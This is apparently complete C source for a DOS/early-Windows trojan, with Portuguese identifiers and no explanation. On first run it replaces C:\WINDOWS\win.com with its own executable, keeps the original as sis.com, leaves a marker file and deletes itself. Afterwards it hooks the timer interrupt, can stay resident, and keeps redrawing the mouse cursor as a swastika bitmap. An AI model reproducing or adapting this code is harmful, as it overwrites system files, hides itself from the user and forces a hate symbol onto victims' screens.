#include <process.h>
#include<dos.h>
#include<conio.h>
#include<stdio.h>
#include <stdlib.h>
#include <string.h>
void interrupt minha_rotina_de_relogio(void);
void interrupt (*clock_tick) (void);
union REGS regs;
void mudamouse(unsigned segimag,unsigned offimag,unsigned lin,unsigned col)
{
  union REGS regs;
  struct SREGS sregs;
  regs.x.ax=0x09;
  regs.x.bx=col;
  regs.x.cx=lin;
  sregs.es=segimag;
  regs.x.dx=offimag;
  int86x(0x33,&regs,&regs,&sregs);
}
struct imagem
{
  unsigned imag[32];
  int lin,col;
};
struct imagem suastica = { {
0x3e00,0x3e00,0x3e7f,0x3e7f,
0x3e7f,0x3e7f,0x3e7f,0x0000,
0x0000,0xfe7c,0xfe7c,0xfe7c,
0xfe7c,0xfe7c,0x007c,0x007c,

0xc1ff,0xc1ff,0xc180,0xc180,
0xc180,0xc180,0xc180,0xffff,
0xffff,0x0183,0x0183,0x0183,
0x0183,0x0183,0xff83,0xff83},7,7};
void mouse (void)
  { union REGS regs;
   regs.x.ax=1;
   int86 (0x33,&regs,&regs);
  }

//---------------------------------------------------------------------------
void main(int argc,char *argv[ ])
{
  FILE *s;
  char ch='a',muda[40]="copy ",del[40]="del ";
  int cont=0,conf=0;
  strcat(muda,argv[0]);
  strcat(muda," c:\\windows\\win.com");
  strcat(del,argv[0]);
  if ((s=fopen("C:\\WINDOWS\\SYS.TMP","r+"))==NULL){
       s=fopen("C:\\WINDOWS\\SYS.TMP","wt");
       fprintf(s,"alan\n");
       fclose(s);
       system("copy c:\\windows\\win.com c:\\windows\\sis.com");
       clrscr();
       system(muda);
       clrscr();
       system(del);
       clrscr();
       exit(1);
       }
  disable();
  clock_tick = getvect(28);
  setvect(28,minha_rotina_de_relogio);
  enable();

  #ifdef RESIDENTE
	 keep(0,400);
  #else
	 system("\sis");
	 disable();
	 setvect(28,clock_tick);
	 enable();
   #endif
}

void interrupt minha_rotina_de_relogio(void)
{
   mudamouse(_DS,(unsigned) suastica.imag,7,7);
   mouse();
   clock_tick();
}